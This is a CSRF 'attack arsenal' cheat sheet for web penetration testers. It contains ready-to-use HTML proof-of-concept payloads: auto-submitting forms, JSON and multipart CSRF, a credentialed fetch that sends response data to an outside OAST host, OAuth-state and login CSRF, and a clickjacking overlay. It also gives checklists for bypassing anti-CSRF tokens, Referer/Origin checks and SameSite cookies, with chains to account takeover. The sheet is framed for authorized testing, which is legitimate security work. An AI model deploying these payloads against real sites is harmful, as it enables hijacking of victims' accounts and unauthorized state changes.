# CSRF Attack Arsenal — PoC Templates, Bypass Strings & the SameSite Matrix

> Companion to `CSRF_TESTING_GUIDE.md`. **Check the cookie's SameSite first** (guide §4) — it decides which of these can possibly work. Replace `target.com`, params, and `attacker@evil.com` (an inbox YOU control). **Always validate in a real default-settings browser, cross-site** (guide §19). Authorized targets + your own two test accounts only (guide §23).

---

*What & when:* start every CSRF test here — the cookie's SameSite value decides which templates below can *possibly* fire in a real browser. Read it (DevTools → Application → Cookies), match it to the row, and only reach for a template the row allows. Skipping this is why most CSRF PoCs fail silently.

## A. The SameSite decision matrix (guide §2.3 / §6) — read this BEFORE picking a template

| Session cookie SameSite | Cross-site POST/JSON/fetch | Cross-site top-level GET nav | Use |
|---|---|---|---|
| **None** (Secure) | ✅ cookie sent | ✅ | any template (B/D/E) — classic CSRF |
| **Lax** (or absent = default) | ❌ cookie NOT sent | ✅ cookie sent | **GET-nav template (C)** only; POST needs a bypass |
| **Strict** | ❌ | ❌ | nothing cross-site — need same-site position (subdomain XSS/takeover, §6.4) |
| (auth is Bearer/localStorage, no cookie) | — | — | **NOT CSRF** — stop |

```
DevTools → Application → Cookies → read SameSite/Secure/HttpOnly/Domain on the session cookie.
```

---

## B. Auto-submit POST form (needs SameSite=None) (guide §23.2)

*What & when:* the classic CSRF PoC — a hidden form that submits itself the moment the victim opens the page. **Only works if the session cookie is `SameSite=None`** (under default Lax the browser won't attach the cookie to this cross-site POST). Use for the common "change email/password" POST actions once you've confirmed None.

```html
<html><body>
<form id="f" action="https://target.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <!-- include ALL required params; omit/forge the token to test validation (§5) -->
</form>
<script>document.getElementById('f').submit();</script>
</body></html>
```

## C. GET state-change under Lax (top-level navigation) (guide §6.1)

*What & when:* your go-to against the modern default (Lax). If a sensitive action accepts **GET**, a top-level navigation (`window.location` / a GET form) still carries the cookie under Lax — so this fires where a POST form can't. Remember: it must be a *navigation*; `<img>`/`<iframe>`/`fetch` are background requests and Lax withholds the cookie from them.

```html
<!-- Lax SENDS the cookie on top-level GET navigation. Use for GET-based sensitive actions. -->
<script>window.location = "https://target.com/account/email/change?email=attacker@evil.com";</script>

<!-- or an auto-submit GET form (also a top-level navigation) -->
<form id="g" action="https://target.com/account/delete" method="GET">
  <input type="hidden" name="confirm" value="1">
</form><script>g.submit()</script>

<!-- NOTE: <img>/<iframe>/fetch are NOT top-level navigations → Lax does NOT send the cookie. Use navigation. -->
```

## D. JSON CSRF — text/plain trick (guide §8/§13)

*What & when:* use against a JSON API when you can't send `application/json` from a form (and a `fetch` would preflight). First just try urlencoded (the second snippet — many JSON APIs accept it). If not, the `text/plain` form shapes a body that *is* valid JSON, CSRFing the endpoint with no JavaScript — works only if the server leniently parses text/plain as JSON.

```html
<!-- A form can only send urlencoded/multipart/text/plain. This builds a valid JSON body via text/plain. -->
<form action="https://target.com/api/account/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
<!-- resulting body: {"email":"attacker@evil.com","ignore":"="}  — works if server parses text/plain as JSON -->
```
```html
<!-- First try the SIMPLEST thing: does the JSON API also accept urlencoded? (very common) -->
<form action="https://target.com/api/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form><script>document.forms[0].submit()</script>
```

## E. Multipart form CSRF (guide §8)
```html
<form action="https://target.com/api/profile" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="email" value="attacker@evil.com">
</form><script>document.forms[0].submit()</script>
```

## F. CORS-credentialed CSRF (when ACAO reflects + ACAC:true) (guide §17)
```html
<script>
fetch('https://target.com/api/account/email', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},
  body:'{"email":"attacker@evil.com"}'
}).then(r=>r.text()).then(t=>fetch('https://YOUR.oast.fun/leak?d='+encodeURIComponent(t)));
</script>
<!-- only works if CORS is misconfigured to allow your origin WITH credentials; verify first -->
```

---

## G. Anti-CSRF token bypass tests (guide §5)

*What & when:* run this whole list whenever a token stands in your way — a token only protects if it's *checked* and *bound to the victim*. The two highest-yield tests: delete the param entirely (often "checked only if present"), and paste **your own** account's token into the victim's request (often "any valid token accepted"). Either success = the token is decorative.

```
□ Remove the token param entirely → submit → accepted?
□ Send token = "" (empty) → accepted?
□ Send token = a value from YOUR OWN session (not the victim's) → accepted? (= not session-bound)
□ Send token of correct length but wrong value → accepted? (= presence-only check)
□ Switch POST→GET (token often not required on GET) (§10)
□ Method override: add  _method=PUT  or header  X-HTTP-Method-Override: PUT
□ Double-submit: if token must equal a cookie you can SET (subdomain/injection) → set both to a known value (§9)
```

## H. Referer / Origin bypass (guide §7)

*What & when:* use when the server checks where the request came from. The #1 win: many servers only validate the Referer *if it's present* and accept it when absent — so strip it (`<meta name="referrer" content="no-referrer">`) and the check passes. Otherwise exploit sloppy substring/suffix matching (`target.com.evil.com`) or a `null` Origin via a sandboxed iframe.

```html
<!-- Strip Referer (server "allows if absent") -->
<meta name="referrer" content="no-referrer">
<!-- per-element -->
<a href="https://target.com/..." rel="noreferrer">x</a>
<form ... referrerpolicy="no-referrer">
```
```
Weak Referer regex (substring/prefix):
  https://target.com.evil.com/       (target.com as YOUR subdomain)
  https://evil.com/target.com        (in path)
  https://evil.com?x=target.com  ·  https://evil.com#target.com
Origin null:
  <iframe sandbox="allow-forms allow-scripts" src="data:text/html,<form...>">   → Origin: null
  redirect chains / data: documents → Origin: null
```

## I. SameSite=Strict → same-site position (guide §6.4)

*What & when:* use when the cookie is `SameSite=Strict` (cross-site dead). Since SameSite is per-*site* not per-origin, any code running on a `*.target.com` subdomain (an XSS there, or a subdomain takeover) issues *same-site* requests that carry the Strict cookie. This turns "Strict = safe" into a CSRF + subdomain-bug chain.

```
Need a request from *.target.com (same site as target.com). Get it via:
  - XSS on any subdomain (run the fetch/form from there) — see XSS guide
  - Subdomain takeover (Recon guide §17) — host your page on a target subdomain
Then a normal same-site request carries the cookie even under Strict.
```

## J. OAuth state CSRF (account linking) (guide §15)

*What & when:* use on "Login/Connect with Google" flows whose callback doesn't validate `state` (OAuth's own CSRF token). Force the victim to complete a link to *your* identity provider account → then you sign in as them. Frequently missed and high-impact.

```html
<!-- If the OAuth callback ignores `state`, force the victim to complete an attacker-initiated link: -->
<img src="https://target.com/oauth/callback?code=ATTACKER_AUTH_CODE&state=anything">
<!-- (use the navigation form if the callback needs top-level + Lax cookie) -->
```

## K. Login CSRF (guide §12)
```html
<form action="https://target.com/login" method="POST">
  <input type="hidden" name="username" value="ATTACKER_ACCOUNT">
  <input type="hidden" name="password" value="ATTACKER_PASSWORD">
</form><script>document.forms[0].submit()</script>
<!-- victim is silently logged into the attacker's account; escalate via what they do next -->
```

---

## L. Generate a PoC from a captured request (guide §23)
```bash
# Save the request (Burp → Copy to file) then:
python3 poc/csrf_poc_generator.py --request req.txt --type auto --out poc.html
#   --type auto | form | get | json | multipart
# Host cross-site, open in the VICTIM browser (DEFAULT settings):
python3 -m http.server 8000   # http://localhost:8000/poc.html
```

---

## M. The validity checklist (paste into every CSRF test) (guide §19)
```
[ ] Auth is a COOKIE the browser auto-sends (not Bearer/localStorage).
[ ] Read the session cookie SameSite: None / Lax / Strict / absent(=Lax).
[ ] Picked the template the SameSite value ALLOWS (matrix §A).
[ ] PoC hosted CROSS-SITE (different origin than target).
[ ] Logged in as VICTIM test account in a DEFAULT-settings browser (SameSite NOT disabled).
[ ] Opened the PoC → the sensitive action ACTUALLY happened.
[ ] Chained to impact (change email → reset → log in as victim).
[ ] NOT relying on Repeater "it worked" (same-site, meaningless for CSRF).
```

## N. SameSite Lax / Strict bypass depth (guide §6) — the modern battleground

*What & when:* your toolbox for when default-Lax (or Strict) is blocking a POST — this is where most 2026 CSRF actually lives. Reach for these in order of ease: a GET-reachable version of the action, the fresh-cookie 2-minute POST window, a same-site subdomain foothold, an on-site client-side redirect gadget, or a 307/308 method-preserving redirector.

> Browsers default cookies to **Lax**, so "classic" POST CSRF often fails. These are the real bypasses that revive it:

```
□ Lax + POST "two-minute window" (Chromium): a freshly-set cookie (just logged in / cookie < 120s old) is sent on a
  cross-site TOP-LEVEL POST. Force the victim through login (or a flow that re-sets the cookie), then auto-POST within ~2 min.
□ GET-accepts-state-change: many endpoints accept the action via GET too → Lax SENDS the cookie on top-level GET nav (§C).
  Try the POST endpoint as GET, and look for sibling GET routes (/delete, /confirm, /change?…).
□ Method override on a GET-reachable route: _method=POST / X-HTTP-Method-Override: POST / ?_method=PUT (framework-dependent).
□ Same-site sub-resource: if any *.target.com page can be made to issue the request (XSS/HTML-injection/open content),
  it's same-site → cookie sent even under Lax/Strict (§I).
□ Top-level navigation only: remember <img>/<iframe>/fetch do NOT send Lax cookies — use window.location / form submit (§C).
□ Strict: needs a same-site origin (subdomain XSS or takeover, §I) OR a "client-side redirect" gadget on target.com that
  re-issues the request same-site (Strict cookies ride a same-site redirect).
□ Cookie scoping: a __Host-/__Secure- session is harder; a non-Secure or Domain-scoped cookie set from a subdomain you
  control (double-submit, §G) can be overwritten.
□ 307/308 method-preserving redirect (§6.7): bounce a cross-site simple-POST through a target redirector that answers
  307/308 → the browser REPLAYS method+body to the redirect target → reach an endpoint/method a form can't craft (302/303
  downgrade to GET and won't help). If the 307 lands SAME-SITE, the Strict/Lax cookie survives (combine with the §Q gadget).
  Find it:  any ?url=/?next=/?redirect= that emits 307 ; trailing-slash / http→https / locale 307s.
```

## O. Token-bypass deep set + token theft (guide §5)
```
□ Not session-bound:  use YOUR token in the VICTIM's request (most common real bug) (§G).
□ Presence-only:      correct length, wrong value → accepted.
□ Optional on some verbs/content-types:  drop token on GET / multipart / text-plain / JSON.
□ Token in a predictable/static/global value (per-app not per-session) → reuse.
□ Token leaked → then it's a "valid token" CSRF: via Referer (token in URL), via a reflected page, via permissive CORS
  (read /api/csrf cross-origin, CORS kit §13), via XSS (XSS kit §M), via an open redirect carrying the token.
□ Double-submit cookie defeat: if you can SET the cookie (subdomain/cookie-injection/HTTP response splitting), set the
  cookie and the body field to the same attacker value → both match → bypass.
□ Token in custom header only (X-CSRF-Token): a form can't set it, but a permissive CORS preflight + ACAC can (CORS kit).
```

## P. Real-world CSRF chains, clickjacking & references
```
□ CSRF → email/password change → password-reset → full ACCOUNT TAKEOVER (the headline impact; lead with it).
□ Login CSRF (§K) → victim acts in attacker's account → later linked to victim's data / payment instrument.
□ OAuth state-less callback CSRF (§J) → attacker account-link → ATO.
□ CSRF on an ADMIN function (add admin user / change settings / disable MFA) → privilege escalation.
□ Clickjacking-assisted: if anti-CSRF blocks scripted submit but the page lacks X-Frame-Options/frame-ancestors,
  frame it and trick the victim into clicking the real button (UI redress) → state change with the real token.
□ CSRF + request smuggling / cache poisoning to deliver same-site (advanced).
□ "Logout CSRF" + login CSRF combo, GraphQL CSRF (single endpoint, check it accepts non-JSON/GET).
```
> **References:** PortSwigger *CSRF* + *Bypassing SameSite restrictions* (Web Security Academy + labs) incl. the
> *SameSite Strict bypass via client-side redirect* research (§Q); OWASP *CSRF Prevention Cheat Sheet* + WSTG *Testing
> for CSRF*; PayloadsAllTheThings *CSRF Injection*; HackTricks *CSRF*; PentesterLab CSRF badges; Chromium *SameSite-by-
> default* / Lax+POST docs + RFC 6265bis; disclosed HackerOne/Bugcrowd "CSRF → account takeover" / "OAuth state"
> writeups; tooling `XSRFProbe` / `Bolt` / Burp *Generate CSRF PoC*. Anchor severity to CWE-352 (+ CWE-1275 for a weak
> SameSite attribute).

---

## Q. SameSite-Strict bypass via on-site client-side redirect / SPA-router gadget (Guide §6.6)
```html
<!-- The FINAL request must be SAME-SITE. Use an on-site (client-side/JS) open redirect or SPA route on the target,
     so the target's OWN code issues the state-changing request → Strict/Lax cookie flows.
     (Server-side 302s usually DON'T re-classify the cookie context — you need a SAME-SITE client-side navigation.) -->
<!-- 1) on-site JS open redirect gadget: target.com/go?to=/account/delete  (the page does location = to) -->
<script>window.location = "https://target.com/go?to=/account/delete?confirm=1";</script>

<!-- 2) SPA client-side route that the router turns into a same-site request with the cookie -->
<script>window.location = "https://target.com/#/account/delete?confirm=1";</script>

<!-- find the gadget: any ?to=/?url=/?next=/?returnUrl= that JS (not the server) follows, or a #/route the SPA acts on. -->
```

## R. Clickjacking-assisted CSRF — when the token can't be scripted (Guide §10.5)

*What & when:* use when a valid, unguessable token means you *can't* forge the request blind — **but** the real settings page is framable (no `X-Frame-Options`/`frame-ancestors`). You frame the genuine page (which carries the victim's real token) invisibly and trick them into clicking the real submit button. Note the SameSite caveat: the framed page is a sub-resource, so this needs `SameSite=None` (or a same-site position) for the cookie to reach it.

```html
<!-- Works when: the settings page is FRAMABLE (no X-Frame-Options / no CSP frame-ancestors) AND the cookie reaches the
     framed sub-resource (SameSite=None, or you're same-site). The framed REAL page carries the victim's REAL token;
     you only steal the click. -->
<style>
  iframe { opacity:0.0001; position:absolute; top:0; left:0; width:1000px; height:800px; z-index:2; border:0; }
  #bait  { position:absolute; z-index:1; top:330px; left:480px; }   /* align over the real submit button */
</style>
<div id="bait">Click to claim your reward 🎁</div>
<iframe src="https://target.com/account/settings"></iframe>
<!-- multi-step actions: align bait over each successive button, or pre-fill via the framed form's own fields. -->
<!-- test framability first:  curl -sI https://target.com/account/settings | grep -iE 'x-frame-options|content-security-policy' -->
```
> Quick framability check decides if clickjacking-CSRF is even possible: **no `X-Frame-Options` and no `frame-ancestors`** → framable. Then it pays only if the cookie reaches the frame (SameSite=None / same-site).

---

> Which template can work is decided by the **SameSite matrix (§A)** and your **baseline (guide §4)**. A finding is real only if it **fires in a default browser cross-site and changes something sensitive** (guide §19/§20). Lead with the **impact** (ATO), not "no token".
